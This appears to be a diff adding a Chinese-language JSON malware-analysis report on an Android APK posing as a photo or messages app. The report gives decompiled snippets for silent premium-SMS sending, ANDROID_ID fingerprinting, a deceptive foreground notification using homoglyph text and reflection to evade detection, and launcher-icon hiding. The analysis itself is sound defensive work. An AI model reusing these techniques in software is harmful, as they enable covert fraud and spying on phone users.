@@ -1,0 +1,148 @@
+{
+  "APK信息": {
+    "文件名": "b2a940600d50d862f539eead80d636b556d32aabc462156fe8b29d44c3337ab8.apk",
+    "sha256": "b2a940600d50d862f539eead80d636b556d32aabc462156fe8b29d44c3337ab8",
+    "包名": "org.faith.groan",
+    "应用名": "Фотo",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 272.6
+  },
+  "行为列表": [
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_send",
+          "中文名": "短信发送",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "sendTextMessage"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\faith\\groan\\a;",
+          "method_signature": "a(Context context, String str, String str2, PendingIntent pendingIntent)",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "try { SmsManager.getDefault().sendTextMessage(str, null, str2, pendingIntent, null); } catch (Exception e) { }",
+          "malicious_code_snippet_context": "try { SmsManager.getDefault().sendTextMessage(str, null, str2, pendingIntent, null); } catch (Exception e) { }",
+          "behavior_description": "该方法通过 SmsManager.getDefault().sendTextMessage() 在后台静默发送短信，目标号码(str)和短信内容(str2)均来自方法参数（通常由C2服务器指令或硬编码的增值服务号码提供），整个过程无需用户知情或确认。异常被空catch块静默吞掉以隐藏发送失败痕迹。结合同类中的 setRepeating 定时任务（每60秒触发）和混淆的类名，该功能被用于后台自动发送欺诈/订阅短信，可直接造成用户话费损失，与Zscaler报告描述的伪装成短信应用的恶意行为一致。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "device_fingerprinting",
+      "中文名": "设备指纹采集",
+      "MITRE": "T1437",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_PHONE_STATE"
+        ],
+        "字符串": [
+          "ANDROID_ID"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\faith\\groan\\a;",
+          "method_signature": "c(Context context)",
+          "malicious_behavior": "device_fingerprinting",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "return Settings.Secure.getString(context.getContentResolver(), \"android_id\");",
+          "malicious_code_snippet_context": "      }\n  \n      public static String c(Context context) {\n>>>         return Settings.Secure.getString(context.getContentResolver(), \"android_id\");\n      }\n  \n      private static void c(Context context, long j) {",
+          "behavior_description": "该方法通过 Settings.Secure.getString 从系统 ContentResolver 中读取设备的 ANDROID_ID（持久化设备唯一标识符），实现设备指纹采集。数据流向：Settings.Secure/ContentResolver（ANDROID_ID 设备标识）→ 作为字符串返回给调用方，用于唯一标识和追踪受害设备。该代码位于混淆类（org.faith.groan.a）中，且样本已被厂商确认是伪装成短信应用、滥用 AccessibilityService 并隐藏自身的间谍软件，此标识大概率与其他窃取数据一同回传 C2 用于受害者画像。此外同类中还存在按时间阈值（约10秒）静默拉起 Generation 组件的逻辑，体现隐蔽运行特征。仅就本片段而言，只采集标识符而未见直接外传，属于过度隐私收集/设备指纹行为。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "persistence",
+      "中文名": "持久化",
+      "MITRE": "T1444",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "foreground_service",
+          "中文名": "前台服务保活",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "startForeground"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\faith\\groan\\Dip;",
+          "method_signature": "if(Build.VERSION.SDK_INT >= 26)",
+          "malicious_behavior": "persistence",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "if (Build.VERSION.SDK_INT >= 26) {\n    this.a.getClass().getMethod(\"createNotification\" + String.valueOf(\"Channel\"), NotificationChannel.class).invoke(this.a, new NotificationChannel(\"org.faith.groan.FUNNY\", \"Estimate\", 1));\n    builder = new Notification.Builder(getApplicationContext(), \"org.faith.groan.FUNNY\");\n} else {\n    builder = new Notification.Builder(getApplicationContext());\n}\nbuilder.setSmallIcon(android.R.drawable.ic_dialog_info).setContentTitle(\"Оcнoвной прoцecс\").setContentText(\"Системa нe кoрректно рaботaeт, вам необхoдимo включить доcтуп к стaтистике для 'Оcнoвной прoцeсc'\");\nstartForeground(877, builder.build());",
+          "malicious_code_snippet_context": "  \n      private void a() throws IllegalAccessException, InvocationTargetException {\n          Notification.Builder builder;\n>>>         if (Build.VERSION.SDK_INT >= 26) {\n>>>             this.a.getClass().getMethod(\"createNotification\" + String.valueOf(\"Channel\"), NotificationChannel.class).invoke(this.a, new NotificationChannel(\"org.faith.groan.FUNNY\", \"Estimate\", 1));\n>>>             builder = new Notification.Builder(getApplicationContext(), \"org.faith.groan.FUNNY\");\n>>>         } else {\n>>>             builder = new Notification.Builder(getApplicationContext());\n>>>         }\n>>>         builder.setSmallIcon(android.R.drawable.ic_dialog_info).setContentTitle(\"Оcнoвной прoцecс\").setContentText(\"Системa нe кoрректно рaботaeт, вам необхoдимo включить доcтуп к стaтистике для 'Оcнoвной прoцecс'\").setWhen(System.currentTimeMillis());\n>>>         startForeground(877, builder.build());\n      }\n  \n      private void b() {",
+          "behavior_description": "该代码是已确认恶意样本（Zscaler 报告的伪装为'Сообщениe/短信'的间谍木马）中 Service 组件的保活逻辑。代码通过反射动态拼接方法名 'createNotification'+'Channel' 调用 createNotificationChannel（规避静态检测），随后构建一个高度欺骗性的通知：标题伪装为系统进程'Основной процесс（主进程）'，正文谎称'系统运行异常，需为主进程开启统计访问权限'，诱导用户授予 PACKAGE_USAGE_STATS 等敏感权限以监控用户应用使用情况；且标题/正文使用拉丁字母与西里尔字母混排（如 Оcнoвной、пoцecc）进行字符级混淆以绕过检测。最终调用 startForeground(877, ...) 将恶意服务提升为前台服务实现持久化保活，防止系统回收进程，为该样本后续利用 AccessibilityService 进行监控窃取提供持续运行保障。数据流向：硬编码的欺骗性俄文通知文本（source）→ Notification.Builder 构建 → startForeground() 前台服务保活（sink），无用户知情同意，属于恶意持久化+社工诱导组合行为。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\faith\\groan\\Seize;",
+          "method_signature": "a()",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "getPackageManager().setComponentEnabledSetting(new ComponentName(getApplicationContext(), (Class<?>) Seize.class), 2, 1);",
+          "malicious_code_snippet_context": "  /* JADX INFO: loaded from: classes.dex */\n  public class Seize extends Activity {\n      private void a() {\n>>>         getPackageManager().setComponentEnabledSetting(new ComponentName(getApplicationContext(), (Class<?>) Seize.class), 2, 1);\n      }\n  \n      @Override // android.app.Activity",
+          "behavior_description": "该 Activity 在 onCreate() 中立即调用 a() 方法，通过 setComponentEnabledSetting 将自身启动组件设置为禁用状态（参数 2 = COMPONENT_ENABLED_STATE_DISABLED），使应用图标从桌面启动器中消失，随后调用 finish() 关闭界面，用户无感知。这与厂商报告中该恶意样本伪装成'Сообщениe（Messages）'并隐藏自身以监控受害者的行为完全吻合，属于间谍类恶意软件的隐蔽驻留手段，使用户难以发现和卸载该恶意应用。数据流向：应用自身组件信息（Seize.class / getApplicationContext()）→ setComponentEnabledSetting() 禁用 launcher 组件（隐藏图标）。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.8",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
